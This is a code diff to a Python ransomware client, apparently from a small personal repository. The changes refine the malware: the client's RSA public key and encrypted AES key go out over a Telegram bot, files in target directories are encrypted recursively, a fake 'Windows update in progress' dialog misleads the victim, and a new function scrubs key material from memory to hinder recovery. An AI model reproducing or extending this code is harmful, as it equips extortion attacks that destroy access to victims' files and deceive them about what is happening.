@@ -13,13 +13,13 @@ from PIL import Image, ImageDraw, ImageFont
 from tkinter import Label, Entry
 import subprocess
 
-fileName='./Client.exe'#'./Client.py'
-afterFileName='Client_after_enc.exe'#'./Client_after_enc.exe'
+fileName=sys.argv[0]
+afterFileName='Client_after_enc.exe'
 
 PRIVATE_KEY_RSA=0
 PUBLIC_KEY_RSA=0
 PRIVATE_KEY_AES=0
-PUBLIC_SERVER_RSA_KEY=PublicKey(b'gmv]R[\x83z\xf9R\xd4?\xbd\x0c\xfc\x0f\xdf\n\xf6\xaa\x9f@\xf8\xb2\xfb\x05\x95\xbcO\xc3wE')
+PUBLIC_SERVER_RSA_KEY=PublicKey(b'A?\xb6\xdcJ\x02e1-\xbfN9BWkY\x13B+\x02\x03\xfa\xe5\xfb)\xf5}\x92\x83\x91\xb4E')
 
 AES_BOX=0
 
@@ -55,13 +55,9 @@ async def sendTelegram(chat_id, msg):
     
 def sendKeyToServer(encrypted_aes_key):
     loop = asyncio.get_event_loop() 
-    loop.run_until_complete(sendTelegram(CHAT_ID, "ClientRSAPublicKey: "))
-    loop = asyncio.get_event_loop() 
-    loop.run_until_complete(sendTelegram(CHAT_ID, str(PUBLIC_KEY_RSA))) 
-    loop = asyncio.get_event_loop()
-    loop.run_until_complete(sendTelegram(CHAT_ID, "EncryptedClientAESKey: "))
-    loop = asyncio.get_event_loop()  
-    loop.run_until_complete(sendTelegram(CHAT_ID, str(encrypted_aes_key)))
+    loop.run_until_complete(
+        sendTelegram(CHAT_ID, "ClientRSAPublicKey: "+str(PUBLIC_KEY_RSA)+
+                     " \n\n"+"EncryptedClientAESKey: "+str(encrypted_aes_key)))
 
 class Encryptor:
     def __init__(self, files=0):
@@ -108,7 +104,7 @@ def listUpTargetDir():
     #        PathList.append(drive)
     #PathList.remove("c:\\")
     #print(f"[DEBUG] PathList: {PathList}")
-    PathList_DEBUG=["E:\\github\\-ransomware3\\최지웅\\test"]
+    PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\test"]
 
 def recursiveEncrypt(basepath):
     global ThreadPool
@@ -136,6 +132,17 @@ def fakeAlert():
     WINDOW=tkinter.Tk()
     WINDOW.withdraw()
     messagebox.showerror("Windows 업데이트 진행 중...", "컴퓨터를 끄지 마십시오")
+
+def dumpVariable():
+    global PRIVATE_KEY_RSA, PUBLIC_KEY_RSA, PRIVATE_KEY_AES, PUBLIC_SERVER_RSA_KEY, AES_BOX, BOT, CHAT_ID, EncryptModule
+    PRIVATE_KEY_RSA=os.urandom(sys.getsizeof(PRIVATE_KEY_RSA)+1)
+    PUBLIC_KEY_RSA=os.urandom(sys.getsizeof(PUBLIC_KEY_RSA)+1)
+    PRIVATE_KEY_AES=os.urandom(sys.getsizeof(PRIVATE_KEY_AES)+1)
+    PUBLIC_SERVER_RSA_KEY=os.urandom(sys.getsizeof(PUBLIC_SERVER_RSA_KEY)+1)
+    AES_BOX=os.urandom(sys.getsizeof(AES_BOX)+1)
+    BOT=os.urandom(sys.getsizeof(BOT)+1)
+    CHAT_ID=os.urandom(sys.getsizeof(CHAT_ID)+1)
+    EncryptModule=os.urandom(sys.getsizeof(EncryptModule)+1)
             
 if __name__=='__main__':
     makeRSAKey()
@@ -158,8 +165,7 @@ if __name__=='__main__':
                 th.join()
     else:
         fakeAdmin()
+    #dumpVariable()
     print("Windows 업데이트가 완료되었습니다.")
-    
-    #os.system("del /f "+fileName)
     os.system(afterFileName)
     sys.exit()
